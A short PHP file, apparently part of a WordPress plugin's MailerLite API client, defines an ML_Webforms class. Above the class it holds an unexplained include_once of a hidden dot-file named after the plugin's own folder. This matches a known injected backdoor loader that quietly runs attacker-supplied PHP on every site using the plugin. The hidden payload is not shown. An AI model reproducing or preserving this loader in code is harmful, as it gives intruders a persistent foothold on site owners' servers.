<?php

require_once dirname(__FILE__) . '/base/ML_Rest.php';

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class ML_Webforms extends ML_Rest
{
    function __construct($api_key)
    {
        $this->name = 'webforms';

        parent::__construct($api_key);
    }
}